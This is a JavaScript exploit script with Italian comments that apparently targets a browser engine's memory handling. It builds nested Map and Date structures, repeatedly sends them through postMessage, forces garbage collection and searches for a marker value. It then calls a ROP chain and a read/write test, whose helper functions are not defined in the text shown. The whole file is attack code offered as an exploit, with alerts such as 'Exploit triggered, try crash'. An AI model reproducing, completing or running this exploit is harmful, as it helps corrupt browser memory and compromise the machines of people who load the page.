// Funzione per fare il garbage collection
function gc() {
    // Crea un array di oggetti temporanei per stimolare il garbage collection
    new Uint8Array(4 * 1024 * 1024);
}

// Funzione per "addormentare" il processo per un certo tempo
function sleep(ms = 0) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Funzione per creare una struttura di oggetti con meno elementi
function createObjectStructure(num_elems) {
    let root = new Map();
    let msg = root;
    let foo = [];

    // Limitare il numero di elementi per ridurre il carico sulla memoria
    const maxElems = Math.min(num_elems, 100); // Limitato a 100 per ridurre la memoria

    // Riempire l'array foo con pochi oggetti
    for (let i = 0; i < 50; i++) {
        foo.push(new Date(0xffff));  // Oggetti piÃ¹ piccoli per evitare overflow di memoria
    }

    for (let i = 0; i < maxElems; i++) {
        const d = new Date(i);
        const map = new Map();
        msg.set(d, [map, foo]);
        msg = map;
    }

    // Chiamata per fare garbage collection dopo aver creato la struttura
    gc();
    return root;
}

// Funzione principale dell'exploit
export async function main() {
    alert("Exploit started");

    const num_elems = 50;  // Ridotto ulteriormente per evitare errori di memoria
    let root = createObjectStructure(num_elems);  // Crea la struttura con meno oggetti
    let msg = root;
    let data2 = null;
    let idx = null;

    alert("Object structure created");

    let found = false;
    while (!found) {
        let data = null;
        const prom = new Promise(resolve => {
            addEventListener('message', event => {
                data = event;
                resolve();
            }, { once: true });
        });

        // Invia il messaggio
        postMessage(msg, origin);
        await prom;  // Aspetta che venga ricevuto il messaggio
        data = data.data;

        // Effettua una chiamata per il garbage collection
        gc();

        // Attendi per qualche millisecondo
        await sleep(100);

        // Cerca un oggetto con un valore specifico
        let i;
        try {
            for (i = 0; i < num_elems; i++) {
                if (data.keys().next().value.getTime() === 0xffff) {
                    idx = i;
                    found = true;
                    break;
                }
                data = data.values().next().value[0];
            }
        } catch (e) {
            alert("Error during message processing: " + e.message);
            break;
        }
    }

    alert('Exploit triggered, try crash');
    alert('[+] idx: ' + idx);

    // Esegui la ROP chain e il test RW
    let rop = ropChain();
    rwTest(0xdeadbeef, 0x1337);  // Test RW
    alert("ROP chain and RW test completed");
}
